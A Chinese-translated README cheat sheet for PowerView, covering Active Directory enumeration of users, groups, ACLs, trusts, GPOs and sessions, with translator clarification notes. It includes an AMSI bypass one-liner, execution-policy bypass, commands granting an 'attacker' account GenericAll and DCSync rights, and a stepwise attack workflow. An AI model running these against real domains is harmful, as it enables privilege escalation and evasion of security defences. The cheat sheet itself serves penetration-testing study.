# ⚡ PowerView - PowerShell AD 枚举

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  PowerShell 活动目录探查
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

## 📋 目录

- [PowerView 是什么](#-what-is-powerview)
- [准备工作](#-setup)
- [域枚举](#-domain-enumeration)
- [用户枚举](#-user-enumeration)
- [组枚举](#-group-enumeration)
- [计算机枚举](#-computer-enumeration)
- [ACL 枚举](#-acl-enumeration)
- [信任关系枚举](#-trust-enumeration)
- [GPO 枚举](#-gpo-enumeration)
- [定位用户与管理员访问权限](#-hunting)
- [速查表](#-quick-reference)

---

<a id="-what-is-powerview"></a>

## 🎯 PowerView 是什么

**PowerView** 是用于 Active Directory（AD，活动目录）枚举与利用的 PowerShell 工具：

- 🔍 **枚举**：用户、组、计算机以及组策略对象（GPO）
- 🔐 **访问控制列表（ACL）**：查找权限配置错误
- 🌐 **信任关系**：梳理域之间的关系
- 🎯 **用户定位**：查找用户登录的位置

---

<a id="-setup"></a>

## 🚀 准备工作

> **版本说明：** PowerSploit 仓库已于 2021 年归档，本文采用其 PowerView 接口。原文关于 BloodHound 附带脚本的说法具有历史背景；当前 SharpHound 是独立的 C# 数据收集器，不能据此认定其分发包包含 PowerView。参见 [PowerSploit 仓库](https://github.com/PowerShellMafia/PowerSploit)与 [SharpHound 官方仓库](https://github.com/SpecterOps/SharpHound)。

### 下载 PowerView

```powershell
# 来自 PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# 来自 SharpHound
# BloodHound 附带 PowerView.ps1
```

### 导入模块

```powershell
# 绕过执行策略
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# 导入
Import-Module .\PowerView.ps1

# 或使用点源方式加载
. .\PowerView.ps1
```

> **环境说明：** 执行策略与 AMSI 是不同机制；进程级执行策略只作用于当前会话，并受组策略优先级约束。下面的反射示例访问非公开实现字段，属于依赖环境的旧示例，不能保证适用于不同 PowerShell／防护版本。原样保留供理解原文。参见 Microsoft 的[执行策略说明](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)与 [AMSI 文档](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)。

### AMSI 绕过（如有需要）

```powershell
# 简单的绕过示例
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

<a id="-domain-enumeration"></a>

## 🏢 域枚举

### 域的基本信息

```powershell
# 获取域信息
Get-Domain

# 获取域 SID
Get-DomainSID

# 获取域策略
Get-DomainPolicy

# 获取域控制器
Get-DomainController
Get-DomainController -Domain other.domain.local

# 获取林信息
Get-Forest
Get-ForestDomain
```

### 域策略

```powershell
# 密码策略
(Get-DomainPolicy)."SystemAccess"

# Kerberos 策略
(Get-DomainPolicy)."KerberosPolicy"
```

---

<a id="-user-enumeration"></a>

## 👤 用户枚举

### 列出用户

```powershell
# 所有用户
Get-DomainUser

# 指定用户
Get-DomainUser -Identity admin

# 用户属性
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# 填写了描述的用户
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

> **标记说明：** `-AdminCount` 筛选当前或曾经具有特权的帐户标记，不能仅凭该标记断定用户目前仍属于受保护的管理组。参见 [Get-DomainUser 参数说明](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/)。

### 查找值得关注的用户

```powershell
# 设置了 SPN 的用户（Kerberoasting 候选目标）
Get-DomainUser -SPN

# 不要求预身份验证的用户（AS-REP）
Get-DomainUser -PreauthNotRequired

# adminCount 标记的用户（受保护的帐户）
Get-DomainUser -AdminCount

# 描述中可能含有密码的用户
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

> **含义澄清：** 下方 `Find-LocalAdminAccess` 查找的是**当前用户**具有本地管理员访问权限的计算机，并不会列出所有拥有管理员权限的用户；原注释的表述较宽泛。参见[官方函数说明](https://powersploit.readthedocs.io/en/latest/Recon/Find-LocalAdminAccess/)。

### 用户会话

```powershell
# 用户登录在哪些计算机上
Find-DomainUserLocation -UserIdentity admin

# 查找具有管理员访问权限的用户
Find-LocalAdminAccess
```

---

<a id="-group-enumeration"></a>

## 👥 组枚举

### 列出组

```powershell
# 所有组
Get-DomainGroup

# 指定组
Get-DomainGroup -Identity "Domain Admins"

# 组成员
Get-DomainGroupMember -Identity "Domain Admins"

# 递归查询成员
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### 重要的组

```powershell
# Domain Admins（域管理员组）
Get-DomainGroupMember -Identity "Domain Admins"

# Enterprise Admins（企业管理员组）
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators（管理员组）
Get-DomainGroupMember -Identity "Administrators"

# 查找用户所属的组
Get-DomainGroup -UserName admin
```

### 本地组

```powershell
# 计算机上的本地管理员
Get-NetLocalGroupMember -ComputerName server01

# 各计算机上的本地管理员
Find-DomainLocalGroupMember -GroupName Administrators
```

---

<a id="-computer-enumeration"></a>

## 💻 计算机枚举

### 列出计算机

```powershell
# 所有计算机
Get-DomainComputer

# 指定计算机
Get-DomainComputer -Identity server01

# 属性
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# 启用了非约束委派的计算机
Get-DomainComputer -Unconstrained
```

### 查找目标

```powershell
# 域控制器
Get-DomainController

# 服务器
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10 计算机
Get-DomainComputer -OperatingSystem "*Windows 10*"

# 较旧的操作系统
Get-DomainComputer -OperatingSystem "*2008*"
```

> **权限澄清：** 原文将 `-CheckShareAccess` 描述为查找可写共享，但该选项实际检查当前用户是否具有**读取**共享的权限，不能据此判断可写性。参见[官方函数说明](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainShare/)。

### 共享资源

```powershell
# 查找共享资源
Find-DomainShare

# 可写的共享资源
Find-DomainShare -CheckShareAccess

# 共享中值得关注的文件
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

<a id="-acl-enumeration"></a>

## 🔐 ACL 枚举

### 基本 ACL 查询

```powershell
# 用户的 ACL
Get-DomainObjectAcl -Identity admin

# 解析 GUID
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# 指定权限
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### 查找值得关注的 ACL

```powershell
# 用户对象上的 GenericAll 权限
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty（写入属性）
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl（修改 DACL）
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

> **结果解读：** 下面只是按 ACE（访问控制项）中的名称进行初步筛选；`-SearchBase` 指定搜索起点，并不将结果限制为域根对象。判断 DCSync 权限时仍需核对域根对象上的相关复制权限、主体及有效权限，不能把所有匹配项直接视为可用的 DCSync 权限。参见 [Get-DomainObjectAcl 参数说明](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/)。

### DCSync 权限

```powershell
# 查找 DCSync 权限
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

### 修改 ACL

```powershell
# 为用户添加 GenericAll 权限
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# 添加 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

<a id="-trust-enumeration"></a>

## 🤝 信任关系枚举

### 域信任关系

```powershell
# 获取信任关系
Get-DomainTrust

# 所有信任关系
Get-DomainTrust -Domain domain.local

# 映射所有信任关系
Get-DomainTrustMapping
```

### 林信任关系

```powershell
# 林信任关系
Get-ForestTrust

# 林中的域
Get-ForestDomain
```

### 信任关系类型

| 信任关系类型 | 方向 | 说明 |
|------------|-----------|-------------|
| 双向信任（Bidirectional） | 双向 | 两个域相互信任 |
| 入站信任（Inbound） | 单向 | 另一个域信任本域 |
| 出站信任（Outbound） | 单向 | 本域信任另一个域 |

---

<a id="-gpo-enumeration"></a>

## 📜 GPO 枚举

> **参数澄清：** 下方 `-ComputerIdentity server01` 按指定计算机查询其适用的 GPO，并非直接按 OU 查询；原注释已保留其含义。参见[官方函数说明](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO/)。

### 列出 GPO

```powershell
# 所有 GPO
Get-DomainGPO

# 按名称查找 GPO
Get-DomainGPO -Identity "Default Domain Policy"

# 指定 OU 上的 GPO
Get-DomainGPO -ComputerIdentity server01
```

> **结果解读：** 下方管道只筛选权限名称，没有核对相关安全主体是否为当前用户或其所属组，因此不能单凭输出断定“当前用户可以修改”。需结合 ACL 中的主体与适用范围判断。参见 [Get-DomainObjectAcl 说明](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/)。

### 查找 GPO 权限

```powershell
# 用户可以修改的 GPO
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### GPO 的作用位置

```powershell
# GPO 所作用的 OU
Get-DomainOU -GPLink "{GPO-GUID}"

# 指定计算机上的 GPO
Get-DomainGPO -ComputerIdentity "server01"
```

---

<a id="-hunting"></a>

## 🎯 定位用户与管理员访问权限

> **版本兼容性：** 所引官方版本的 `Find-LocalAdminAccess` 接受 `-ComputerName`，其参数表未列出原文中的 `-ComputerFile`；该示例需要核对实际加载的脚本版本。后文 `Invoke-UserHunter` 也属于旧名称，所引文档使用 `Find-DomainUserLocation`，且 `-Stealth` 只缩小会话查询的目标范围，不表示不可检测。命令均按原文保留。参见 [Find-LocalAdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Find-LocalAdminAccess/) 与 [Find-DomainUserLocation](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/)。

### 查找管理员访问权限

```powershell
# 我们在哪些计算机上具有本地管理员权限？
Find-LocalAdminAccess

# 使用多线程
Find-LocalAdminAccess -Threads 10

# 在指定计算机上查询
Find-LocalAdminAccess -ComputerFile computers.txt
```

> **选项说明：** `-CheckAccess` 会检查当前用户对已找到目标用户的计算机是否具有本地管理员访问权限；它并非将初始查询限制为“已有访问权限的计算机”。参见[官方参数说明](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/)。

### 查找用户登录位置

```powershell
# 用户登录在哪些计算机上？
Find-DomainUserLocation

# 指定用户
Find-DomainUserLocation -UserIdentity admin

# 仅查询我们具有访问权限的计算机
Find-DomainUserLocation -CheckAccess
```

### 查找会话

```powershell
# 计算机上的会话
Get-NetSession -ComputerName dc01

# 已登录的用户
Get-NetLoggedon -ComputerName server01

# RDP 会话
Get-NetRDPSession -ComputerName server01
```

### 定位特定用户

```powershell
# 查找 Domain Admins 成员
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 检查他们登录的位置
Invoke-UserHunter

# 隐蔽模式
Invoke-UserHunter -Stealth
```

---

<a id="-quick-reference"></a>

## 📊 速查表

### 常用命令

| 命令 | 说明 |
|---------|-------------|
| `Get-Domain` | 域信息 |
| `Get-DomainUser` | 列出用户 |
| `Get-DomainGroup` | 列出组 |
| `Get-DomainComputer` | 列出计算机 |
| `Get-DomainController` | 列出域控制器（DC） |
| `Get-DomainTrust` | 列出信任关系 |
| `Get-DomainGPO` | 列出 GPO |
| `Find-LocalAdminAccess` | 查找管理员访问权限 |
| `Find-DomainUserLocation` | 查找用户会话 |

### Kerberos 相关目标

| 命令 | 说明 |
|---------|-------------|
| `Get-DomainUser -SPN` | Kerberoasting 候选目标 |
| `Get-DomainUser -PreauthNotRequired` | AS-REP Roasting 候选目标 |
| `Get-DomainComputer -Unconstrained` | 非约束委派 |

> **属性说明：** 下方 `-Properties` 选择要返回的属性，而 `-LDAPFilter` 和管道中的条件才用于筛选对象；原文第一条注释容易混淆这两种含义。参见 [Get-DomainUser 文档](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/)。

### 常用筛选方式

```powershell
# 按属性筛选
Get-DomainUser -Properties samaccountname,description

# LDAP 筛选条件
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Where 筛选条件
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### 攻击流程

```powershell
# 1. 导入
Import-Module .\PowerView.ps1

# 2. 枚举域
Get-Domain
Get-DomainController

# 3. 查找用户
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. 查找管理员访问权限
Find-LocalAdminAccess

# 5. 定位用户
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. 检查 ACL
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

## 📚 参考资源

- [PowerView GitHub 仓库](https://github.com/PowerShellMafia/PowerSploit)
- [HarmJ0y 博客](https://blog.harmj0y.net/)
- [PowerView 速查表](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### 相关速查表
- [BloodHound](../../BloodHound/README.md)
- [PowerShell](../../PowerShell/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

<p align="center">
  <b>⚡ 使用 PowerShell 探查 AD！</b><br>
  <i>PowerView - 经典的 AD 枚举工具</i>
</p>
